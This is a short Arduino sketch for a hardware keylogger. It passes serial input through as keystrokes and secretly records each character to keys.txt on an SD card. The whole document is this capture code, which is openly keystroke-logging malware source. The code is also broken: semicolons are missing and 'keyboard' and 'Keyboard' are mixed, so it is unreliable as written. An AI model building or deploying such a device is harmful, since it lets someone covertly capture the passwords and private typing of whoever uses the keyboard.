#include <keyboard.h>
#include <SD.h>

// choose SD card chip pin
const int  chip = 10

// variable for txt file
File keylogs

void setup() {
  keyboard.begin();

  if(SD.begin(chip)) {
	keylogs = SD.open("keys.txt", FILE_WRITE);
  }
}

void loop() {
  if(Serial.available() > 0) {
	  char keyPress = Serial.read();
	  Keyboard.write(keyPress);
	
	  if(keylogs) {
		  keylogs.print(keyPress);
	  }
  }
}